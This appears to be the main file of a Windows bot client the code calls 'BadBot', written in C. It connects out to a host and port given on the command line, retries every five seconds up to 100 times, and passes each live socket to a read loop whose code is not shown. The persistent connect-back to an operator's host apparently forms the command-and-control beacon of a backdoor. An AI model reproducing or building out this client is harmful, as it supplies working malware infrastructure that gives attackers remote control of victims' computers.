#include "./includes/main.h"

#include <stdbool.h>

#include <stdio.h>

#define MAX_TRIES 100

// Initiates the Socket DLL version
static void init_Wsa(void)
{
    // Socket Version
    WORD wVersionRequested;
    WSADATA wsaData;

    // Error Handling
    int err = 0;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);

    // returning zero and WSASetLastError should be called
    if (err != 0)
        return;

    return;
}

int main(int argc, char **argv)
{
    // Win Socket
    SOCKET winSock;
    int conn_tries = 0;

    char *host;
    int port;

    if (argc != 3)
    {
        puts("[BadBot] invalid syntax ./badbot [host] [port]");
        return EXIT_FAILURE;
    }

    host = argv[1];

    if ((port = atoi(argv[2])) == 0)
    {
        puts("[BadBot] Please provide a valid port number!");
        return EXIT_FAILURE;
    }

    // Setup the Winsock DLLs
    init_Wsa();

    while (conn_tries++ != MAX_TRIES)
    {
        winSock = establishConnection(host, port);

        printf("[BadBot] Reconnection Status: %d\n", conn_tries);

        // Connection Retry
        if ((int)winSock == -1 || winSock == INVALID_SOCKET)
        {
            Sleep(5000);
            continue;
        }

        // Reset tries
        conn_tries = 0;

        readLoop(winSock);

        closesocket(winSock);
    }

    WSACleanup();

    return EXIT_SUCCESS;
}
